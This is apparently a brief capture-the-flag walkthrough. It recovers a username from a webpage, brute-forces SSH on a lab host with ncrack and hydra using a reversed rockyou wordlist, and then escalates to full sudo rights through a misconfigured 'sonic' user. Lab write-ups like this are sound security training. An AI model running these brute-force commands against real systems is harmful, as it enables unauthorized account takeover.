When we access the webpage, we see the name "tails". We'll use this to brute force the SSH service

ncrack -u tails -P /usr/share/wordlists/rockyou.txt -vv -T 5 ssh://172.17.0.2:22

Unfortunately, the correct password is at the end of the rockyou.txt list

tac /usr/share/wordlists/rockyou.txt | tr -d ' ' > /usr/share/wordlists/reverse_rockyou.txt

hydra -l tails -P /usr/share/wordlists/reverse_rockyou.txt -t 16 172.17.0.2 ssh

When we login, we see that we can use the bash command as the sonic user

Afterwards, we see that, as the sonic user, we can run any commands as sudo
